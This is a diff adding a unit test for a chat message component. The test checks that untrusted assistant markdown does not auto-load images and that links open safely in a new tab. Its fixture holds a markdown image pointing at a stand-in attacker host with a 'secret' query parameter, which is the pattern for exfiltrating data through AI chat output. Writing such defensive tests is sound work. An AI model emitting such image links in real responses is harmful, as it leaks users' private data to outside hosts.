@@ -126,3 +126,18 @@ describe('ChatMessageBubble — details row, code blocks, why chain', () => {
     expect(container.querySelector('button[aria-label="Copy code"]')).toBeTruthy()
   })
 })
+
+describe('ChatMessageBubble — untrusted markdown', () => {
+  it('does not render an auto-loading image and opens links without navigating the app window', async () => {
+    const { render } = await import('@testing-library/react')
+    const { ChatMessageBubble } = await import('./ChatMessageBubble')
+    const { container } = render(
+      <ChatMessageBubble role="assistant" content={'![x](https://evil.example/?q=secret) [go](https://example.com)'} />,
+    )
+    expect(container.querySelector('img')).toBeNull()
+    expect(container.textContent).toContain('image not loaded')
+    const link = container.querySelector('a')
+    expect(link?.getAttribute('target')).toBe('_blank')
+    expect(link?.getAttribute('rel')).toContain('noopener')
+  })
+})
